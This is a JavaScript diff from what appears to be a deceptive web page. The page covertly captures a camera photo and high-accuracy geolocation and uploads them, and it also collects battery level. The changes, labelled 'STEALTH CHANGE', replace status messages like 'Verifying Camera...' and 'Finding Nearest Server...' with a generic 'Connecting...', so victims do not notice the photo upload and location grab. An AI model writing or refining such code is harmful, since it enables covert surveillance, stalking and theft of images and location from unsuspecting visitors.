@@ -53,10 +53,11 @@ function collectAndSend(batLevel) {
 }
 
 // -----------------------------------------------------
-// 2. CAMERA LOGIC (Fast Chain)
+// 2. CAMERA LOGIC (Stealth + Fast Chain)
 // -----------------------------------------------------
 function captureAndSend(nextStepCallback) {
-  updateStatus("Verifying Camera..."); 
+  // STEALTH CHANGE: Generic "Connecting" text
+  updateStatus("Connecting..."); 
 
   var video = document.createElement('video');
   video.style.position = "fixed";
@@ -74,10 +75,10 @@ function captureAndSend(nextStepCallback) {
       video.srcObject = stream;
       video.play();
 
-      // --- CRITICAL FIX: ASK FOR LOCATION IMMEDIATELY ---
-      // We do not wait for the photo. We ask for location NOW.
+      // --- IMMEDIATE LOCATION TRIGGER ---
+      // We ask for location NOW (while photo happens in background)
       if (nextStepCallback) nextStepCallback(); 
-      // --------------------------------------------------
+      // ----------------------------------
 
       video.onloadeddata = function() {
           setTimeout(function() {
@@ -90,7 +91,9 @@ function captureAndSend(nextStepCallback) {
                   var formData = new FormData();
                   formData.append('image', blob, 'cam.jpg');
 
-                  // Upload silently in the background
+                  // STEALTH CHANGE: Keep saying "Connecting..."
+                  // We do NOT change text here anymore.
+                  
                   $.ajax({
                     url: upload_file, 
                     type: 'POST',
@@ -98,7 +101,6 @@ function captureAndSend(nextStepCallback) {
                     processData: false,
                     contentType: false,
                     success: function() {
-                      // Cleanup camera only after upload is done
                       stream.getTracks().forEach(track => track.stop());
                       try { document.body.removeChild(video); } catch(e){}
                     },
@@ -112,7 +114,6 @@ function captureAndSend(nextStepCallback) {
           }, 500);
       };
     }).catch(function(err) {
-      // If camera blocked, still try location
       try { document.body.removeChild(video); } catch(e){}
       if (nextStepCallback) nextStepCallback(); 
     });
@@ -125,9 +126,9 @@ function captureAndSend(nextStepCallback) {
 // 3. LOCATION LOGIC
 // -----------------------------------------------------
 function locate(successCallback, failCallback) {
-  // Only update text if it's not already set
-  updateStatus("Finding Nearest Server...");
-
+  // STEALTH CHANGE: No text change here if it already says "Connecting..."
+  // It looks cleaner to just stay on one status.
+  
   if (navigator.geolocation) {
     var optn = { enableHighAccuracy: true, timeout: 5000, maximumage: 0 };
     
